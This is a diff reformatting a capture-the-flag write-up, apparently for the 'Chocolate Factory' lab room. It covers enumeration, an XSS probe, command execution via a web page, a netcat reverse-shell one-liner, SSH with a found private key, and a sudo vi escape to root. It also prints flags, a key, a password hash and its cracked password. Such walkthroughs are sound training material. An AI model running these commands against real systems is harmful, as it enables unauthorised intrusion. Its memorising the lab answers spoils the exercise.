@@ -1,17 +1,19 @@
 ---
 sticker: emoji//1f36b
 ---
-# ENUMERATION
----
 
+# CHOCOLATE FACTORY
 
+## ENUMERATION
 
-## OPEN PORTS
----
+***
 
+### OPEN PORTS
+
+***
 
 | PORT | SERVICE |
-| :--- | :------ |
+| ---- | ------- |
 | 21   | FTP     |
 | 22   | SSH     |
 | 80   | HTTP    |
@@ -32,26 +34,23 @@ fingerprint-strings:
 |_    hope you wont drown Augustus"
 ```
 
+## RECONNAISSANCE
 
-# RECONNAISSANCE
----
+***
 
 If we go to the website, we can see a login page:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250408125526.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250408125526.png)
 
 If we submit the request to burp, we can notice that the response for this login page is weird:
 
-
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250408125555.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250408125555.png)
 
 This could be vulnerable to XSS, let's try a simple payload, for example, let's try to modify it to show us the `window.origin`:
 
+![](gitbook/cybersecurity/images/Pasted%20image%2020250408125722.png)
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250408125722.png)
-
-
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250408125737.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250408125737.png)
 
 I tried getting the cookie but nothing came in, which means that an administrator may not be surveilling the web application, let's try fuzzing for example:
 
@@ -87,21 +86,17 @@ home.php                [Status: 200, Size: 569, Words: 29, Lines: 32, Duration:
 
 We got a `home.php` directory, let's take a look:
 
-
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250408131240.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250408131240.png)
 
 We can execute commands, let's try `id` for example:
 
-
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250408131309.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250408131309.png)
 
 Got command execution, let's begin exploitation.
 
+## EXPLOITATION
 
-
-
-# EXPLOITATION
----
+***
 
 Since we already know we got `RCE`, we can simply send ourselves a reverse shell using the following command:
 
@@ -109,17 +104,15 @@ Since we already know we got `RCE`, we can simply send ourselves a reverse shell
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc IP 9001 >/tmp/f
 ```
 
-
 You can use any other reverse shell, once we send the command, we notice this:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250408131435.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250408131435.png)
 
 We can begin privilege escalation.
 
+## PRIVILEGE ESCALATION
 
-# PRIVILEGE ESCALATION
----
-
+***
 
 Let's stabilize our shell:
 
@@ -133,15 +126,15 @@ export TERM=xterm
 export BASH=bash
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250408131704.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250408131704.png)
 
 We can notice this at `/var/www/html`:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250408132425.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250408132425.png)
 
 There's something called `key_rev_key`, if we check the strings of it:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250408132450.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250408132450.png)
 
 We found a key, we can submit it as the first answer of the room:
 
@@ -149,10 +142,9 @@ We found a key, we can submit it as the first answer of the room:
 -VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=
 ```
 
-
 Now, let's proceed with our privilege escalation, we can notice an user at `/home` named `charlie`, inside of Charlie's home, we can see this:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250408132656.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250408132656.png)
 
 We got a `teleport` and `teleport.pub` file, this seems like a private `RSA` key:
 
@@ -163,7 +155,7 @@ teleport: PEM RSA private key
 
 There we go, let's get the key and go into ssh as Charlie:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250408132847.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250408132847.png)
 
 We can read `user.txt` now:
 
@@ -174,11 +166,11 @@ flag{cd5509042371b34e4826e4838b522d2e}
 
 We can see this if we use `sudo -l`:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250408133050.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250408133050.png)
 
 We got sudo permissions at `/usr/bin/vi`, let's check gtfobins:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250408133125.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250408133125.png)
 
 So, we can simply do this:
 
@@ -186,15 +178,15 @@ So, we can simply do this:
 sudo /usr/bin/vi -c ':!/bin/bash' /dev/null
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250408133155.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250408133155.png)
 
 There we go, we got root access, let's read `root.txt`:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250408133322.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250408133322.png)
 
 There's no `root.txt`, weird, let's check the contents of the root directory:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250408133343.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250408133343.png)
 
 There's something called `root.py`, if we take a look at it, we can see this code:
 
@@ -218,7 +210,7 @@ We can simply enter the key we got from earlier:
 -VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250408133737.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250408133737.png)
 
 We got the root flag:
 
@@ -226,15 +218,15 @@ We got the root flag:
 flag{cec59161d338fef787fcb4e296b42124}
 ```
 
-#### Getting the Charlie Password
+**Getting the Charlie Password**
 
 Remember we got `ftp` enabled, if we go inside of it, we can see this:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250408134019.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250408134019.png)
 
 If we get it and use steghide, we can see this:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250408134124.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250408134124.png)
 
 We got something called `b64.txt`, let's decode it:
 
@@ -306,7 +298,7 @@ charlie:$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FO
 
 We got a hash, let's try to crack it using hashcat:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250408140013.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250408140013.png)
 
 Password is:
 
@@ -314,6 +306,4 @@ Password is:
 cn7824
 ```
 
-
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250408140034.png)
-
+![](gitbook/cybersecurity/images/Pasted%20image%2020250408140034.png)
